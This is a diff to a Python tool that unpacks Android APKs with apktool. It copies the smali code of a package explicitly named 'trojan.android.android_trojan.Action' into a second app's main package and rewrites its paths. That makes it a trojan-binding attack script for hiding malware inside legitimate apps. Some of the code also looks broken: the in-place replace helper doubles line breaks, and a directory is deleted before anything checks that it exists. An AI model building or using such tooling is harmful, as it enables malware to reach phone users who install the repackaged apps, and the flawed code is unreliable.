@@ -1,15 +1,19 @@
 __author__ = 'hoodlums'
 
 import xml.etree.ElementTree as ET
+import fileinput
 from subprocess import call
 import argparse
 import os
 import shutil
 import sys
+import glob
 
 
 apktool = "/home/hoodlums/apktool/apktool"
 TempDirectory = '/tmp/'
+
+packageToInject = 'trojan.android.android_trojan.Action'
 
 apk1 = TempDirectory + 'apk1.apk'
 apk2 = TempDirectory + 'apk2.apk'
@@ -44,18 +48,23 @@ class ParseManifest:
         self.services = []
         self.receiver = []
         self.mainactivity = None
+        self.mainpackage = None
 
     def findMainActivity(self):
-        if self.mainactivity is not None:
+        if self.mainactivity is None:
             for child in self.root.iter('activity'):
                 for child0 in child:
                     for child1 in child0:
-                        if child1.get(
-                                '{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
+                        if child1.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                             self.mainactivity = child.get('{http://schemas.android.com/apk/res/android}name')
-                            return child.get('{http://schemas.android.com/apk/res/android}name')
+                            return self.mainactivity
         else:
             return self.mainactivity
+
+    def findMainPackage(self, ):
+        if self.mainpackage is None:
+            self.mainpackage = self.root.get('package')
+        return self.mainpackage
 
     def listPermissions(self):
         if len(self.permissions) == 0:
@@ -76,11 +85,17 @@ class ParseManifest:
                 self.receiver.append(child.get('{http://schemas.android.com/apk/res/android}name'))
         return self.receiver
 
+
 def error(message, ex, code):
     print(message)
     if ex:
         print(ex)
     sys.exit(code)
+
+def sed(file, old, new):
+    for line in fileinput.input(file, inplace=True):
+        print(line.replace(old, new))
+
 
 
 args = ParseArgs().getargs()
@@ -105,5 +120,14 @@ except OSError as ex:
 ParseManifest1 = ParseManifest(manifest=apk1Manifest)
 ParseManifest2 = ParseManifest(manifest=apk2Manifest)
 
-ParseManifest1.listReceiver()
+apk1Action = apk1Smali + packageToInject.replace('.', '/') + '/'
+apk2Action = apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'
+
+shutil.rmtree(apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')
+shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/',
+            apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')
+
+for file in glob.glob(apk2Action + '*.smali'):
+    sed(file, ParseManifest1.findMainPackage().replace('.', '/'), ParseManifest2.findMainPackage().replace('.', '/'))
+
 
